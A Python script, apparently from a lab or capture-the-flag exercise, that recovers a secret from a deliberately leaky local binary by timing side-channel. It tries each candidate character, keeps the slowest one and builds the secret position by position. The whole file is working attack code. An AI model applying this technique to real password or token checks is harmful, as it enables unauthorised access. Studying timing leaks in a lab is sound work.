
# scripts/attack.py
# Recover SECRET from leaky binary using timing measurements.
import subprocess, time, statistics, string, os, sys, random

BIN = os.environ.get("BIN", "../leaky")
TRIALS = int(os.environ.get("TRIALS", "5"))
ALPHABET = string.ascii_lowercase + string.ascii_uppercase + string.digits

def time_guess(prefix):
    # Run the binary and measure wall-clock time
    start = time.perf_counter()
    res = subprocess.run([BIN, prefix], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    end = time.perf_counter()
    return (end - start), res.returncode

def best_next_char(known):
    times = []
    for ch in ALPHABET:
        guess = known + ch
        samples = []
        for _ in range(TRIALS):
            t, _ = time_guess(guess)
            samples.append(t)
        avg = statistics.mean(sorted(samples)[1:-1]) if len(samples) >= 3 else statistics.mean(samples)
        times.append((avg, ch))
    times.sort(reverse=True)  # longest time first
    return times[0]

def main():
    known = ""
    print("Starting timing attack...")
    for i in range(64):  # cap to avoid infinite loops
        avg, ch = best_next_char(known)
        candidate = known + ch
        t, rc = time_guess(candidate)
        print(f"pos={i} chose='{ch}' avg={avg*1000:.3f}ms rc={rc}")
        known = candidate
        if rc == 0:
            print(f"[+] Recovered secret: {known}")
            return
    print("[-] Failed to fully recover within iteration cap; last guess:", known)

if __name__ == "__main__":
    main()
